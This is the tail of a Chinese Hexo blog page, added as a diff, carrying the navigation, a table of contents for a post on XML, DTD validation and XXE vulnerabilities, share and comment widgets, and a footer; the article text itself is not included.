+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/01/19/xnuca/">
+                    Xnuca
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/01/18/hctf-2016-write-up/">
+                    Hctf 2016 Write Up
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML基础"><span class="toc-number">1.</span> <span class="toc-text">XML基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DTD验证"><span class="toc-number">2.</span> <span class="toc-text">DTD验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-漏洞"><span class="toc-number">3.</span> <span class="toc-text">XXE 漏洞</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-5 i,
+        .toc-level-5 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Xxe漏洞及xxe练习　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/01/18/xxe漏洞及xxe练习/" data-title="Xxe漏洞及xxe练习" data-url="http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"shinpachi8"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+            // Add comment count
+            $(function(){ 
+                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/01/18/xxe漏洞及xxe练习/&callback=?";
+                $.getJSON(jsonUrl, function(result){
+                    $.each(result.response, function(i, field){
+                        var value = field.comments;
+                        if (value > 0) {
+                            $(".count-comment").text(value);
+                            return;
+                        }
+                    })
+                })
+            })
+        
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/01/19/xnuca/" title="上一篇: Xnuca">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/01/18/hctf-2016-write-up/" title="下一篇: Hctf 2016 Write Up">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/xnuca/">Xnuca</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/xxe漏洞及xxe练习/">Xxe漏洞及xxe练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/hctf-2016-write-up/">Hctf 2016 Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/16/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 Shinpachi8
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
